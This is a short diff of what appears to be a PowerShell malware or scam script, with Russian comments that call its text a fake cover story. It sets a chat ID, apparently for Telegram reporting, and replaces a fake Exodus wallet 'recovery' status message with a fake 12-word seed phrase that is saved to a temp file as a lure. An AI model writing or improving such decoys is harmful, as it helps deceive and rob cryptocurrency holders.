@@ -7,15 +7,10 @@ $chatId = "1940923712"
 
 # 2. СОЗДАЕМ ФЕЙКОВЫЙ ТЕКСТ ДЛЯ БЛОКНОТА (Легенда)
 $fakeContent = @"
-EXODUS WALLET RECOVERY SYSTEM
-------------------------------
-Status: Synchronizing with blockchain...
-Error: 0x8004210B (Connection Timeout)
-Action Required: Please keep this window open for 2-3 minutes.
-The system is attempting to decrypt the backup seed phrase.
-
-Current Node: 185.241.104.11
-Status: Waiting for handshake...
+RECOVERY_PHRASE (BIP39):
+1. vintage  2. copper  3. simple  4. juice
+5. focus    6. [HIDDEN] 7. fatigue 8. dynamic
+9. provide  10. hybrid  11. gossip  12. victory
 "@
 
 $fakeFile = "$env:TEMP\recovery_log.txt"
